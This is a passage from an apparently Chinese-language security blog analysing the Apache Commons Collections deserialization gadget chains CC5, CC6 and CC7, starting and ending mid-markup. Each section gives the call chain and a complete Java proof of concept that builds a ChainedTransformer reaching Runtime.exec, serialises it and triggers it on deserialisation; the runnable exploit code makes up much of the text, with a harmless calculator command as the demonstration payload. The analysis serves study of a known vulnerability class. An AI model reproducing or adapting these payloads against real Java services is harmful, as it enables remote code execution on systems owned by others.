class="line">&#125;</span><br></pre></td></tr></table></figure><p>并没有什么新东西，具体逻辑便是通过设置PriorityQueue 的comparator属性为我们定义好的ChainedTransformer ，使ChainedTransformer 的transformer方法执行，结合TrAXFilter与InstantiateTransformer触发TemplatesImpl 恶意字节码的类生成并触发其构造方法达到命令执行的目的。</p><h1 id="Apache-Commons-Collections-5"><a href="#Apache-Commons-Collections-5" class="headerlink" title="Apache-Commons-Collections 5"></a>Apache-Commons-Collections 5</h1><p>LazyMap+TideMap+BadAttributeValueExpException </p><h2 id="版本-3"><a href="#版本-3" class="headerlink" title="版本"></a>版本</h2><p>CommonsCollections 3.1 - 3.2.1，JDK 7u80 以上（低于7u80的BadAttributeValueExpException 无readObject方法）</p><h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><p>调试该链时，因为涉及toString函数调用，所以idea调试请关闭此俩选项</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        TiedMapEntry.toString()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前半部分和CC1一样，后半部分引入了TiedMapEntry 和BadAttributeValueExpException ，我们来分析一下这俩东西。</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>首先我们在CC1中已经知道了LazyMap的get方法会触发其在decorate中传入的Transfromer类的transform方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>在TiedMapEntry类中存在方法getValue，会调用在构造函数中传入的map的get方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_2.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_3.png"></p><p>而且在TiedMapEntry类中同时也存在方法toString会调用getValue方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_4.png"></p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>该类的readObject方法如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_5.png"></p><p>这里会调用toString方法，然后进入TideMapEntry开始链的执行。<br>这里valObj就是val变量的值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line"> val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"> val.set(poc,tiedmap);</span><br></pre></td></tr></table></figure><p>所以我们在POC中用反射将val变量进行了赋值，赋的值是恶意TiedMapEntry 对象。</p><p>这里有一个细节就是，val变量是可以通过构造函数赋值的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_6.png"></p><p>但是如果用构造函数直接给val赋值的话，会导致val在赋值的时候便触发toString,导致在反序列化时，valObject的值改变，导致原本预期的逻辑改变，无法进入预想的分支。</p><p>这是预期的情况（通过后期反射赋值val）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_7.png"></p><p>这是非预期情况（通过构造函数直接给val赋值，这里的val值直接变成了一个字符串，不要以为是ProcessImpl对象！注意引号！）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_8.png"></p><h1 id="Apache-Commons-Collections-6"><a href="#Apache-Commons-Collections-6" class="headerlink" title="Apache-Commons-Collections 6"></a>Apache-Commons-Collections 6</h1><p>TideMap.hashcode+Lazymap</p><h2 id="版本-4"><a href="#版本-4" class="headerlink" title="版本"></a>版本</h2><p>CommonsCollections 3.1 - 3.2.1</p><h2 id="HashSet利用链"><a href="#HashSet利用链" class="headerlink" title="HashSet利用链"></a>HashSet利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashSet.readObject()</span><br><span class="line">        java.util.HashMap.put()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                    ...</span><br><span class="line">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                    java.lang.reflect.Method.invoke()</span><br><span class="line">                        java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在TiedMapEntry 中，除了toString，还有hashCode方法可以调用getValue方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><p>那么这个hashCode方法哪里可以被调用呢？cc6中使用的是HashMap#hash</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>那么哪里调用了HashMap.hash且传入了可控参数？这里用到了HashMap#put：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_2.png"></p><p>那么哪里调用了HashMap.put 且传入了可控参数？这里用到了HashSet#readObject：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_3.png"></p><p>这里的e就是一个反序列化对象。那么由此观之，链完整了。这里的e值是HashMap里table中每一个Node的Key值，他这里循环读取table中的所有Node的Key值并处理。</p><h3 id="POC分析-1"><a href="#POC分析-1" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(node,tiedmap);</span><br></pre></td></tr></table></figure><p>这里是用反射，去修改HashSet里的map属性中的table数组第一项的key值为恶意TiedMapEntry对象</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_4.png"></p><p>这里涉及到HashMap的结构。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">简而言之，HashMap底层是由一个叫table的长数组组成的，table中每一项都称为Node，每个Node存储的便是键值信息</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_5.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_6.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_7.png"></p><h2 id="HashMap利用链"><a href="#HashMap利用链" class="headerlink" title="HashMap利用链"></a>HashMap利用链</h2><p>利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">            TiedMapEntry.getValue()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tmap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在HashMap#readObject中存在这样的代码块</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_8.png"></p><p>跟进putForCreate方法发现它可以调用hash方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_9.png"></p><p>那么思路很明显了，我们可以通过HashMap的readObject方法去调用HashMap#putForCreate 进而调用HashMap#hash 从而实现这条链。</p><h3 id="POC分析-2"><a href="#POC分析-2" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashMap.put(tmap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">lazyMap.clear();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们此处有个clear()操作</p><p>我们在序列化前对HashMap进行put操作时，会调用equals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_10.png"></p><p>一直跟下去会发现会触发lazymap的get方法，我们这里会发现调用了put方法向lazymap增加了键值对。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_11.png"></p><p>可以发现添加了一个ProcessImpl对象的value，这个对象没有实现序列化接口，不能被序列化，所以如果没有lazymap2.remove(“yy”)，就会导致在序列化时出现错误。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_12.png"></p><p>所以通过lazymap2.remove(“yy”)，可以帮助我们剔除在hashtable#put时添加进lazymap2中的不可序列化的对象，实现序列化。</p><h1 id="Apache-Commons-Collections-7"><a href="#Apache-Commons-Collections-7" class="headerlink" title="Apache-Commons-Collections 7"></a>Apache-Commons-Collections 7</h1><h2 id="版本-5"><a href="#版本-5" class="headerlink" title="版本"></a>版本</h2><p>CommonsCollections 3.1 - 3.2.1</p><h2 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">  HashTable.reconstitutionPut()</span><br><span class="line">    AbstractMapDecorator.equals()</span><br><span class="line">       AbstractMap.equals()</span><br><span class="line">         LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                    Class.getMethod()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                    Runtime.getRuntime()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                    Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc7&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Hashtable#readObject中存在如下代码块</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><p>存在方法reconstitutionPut，进行跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_1.png"></p><p>这里会将两个LazyMap用AbstractMapDecorator#equals 进行比较。这里的两个key值就分别代表着两个LazyMap。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_2.png"></p><p>跟进后发现又有一个equals方法，跟进来到AbstractMap#equals</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_3.png"></p><p>发现会对传入的TiedMapEntry调用get方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_4.png"></p><p>这样看，链就明了了。</p><h3 id="POC分析1"><a href="#POC分析1" class="headerlink" title="POC分析1"></a>POC分析1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span 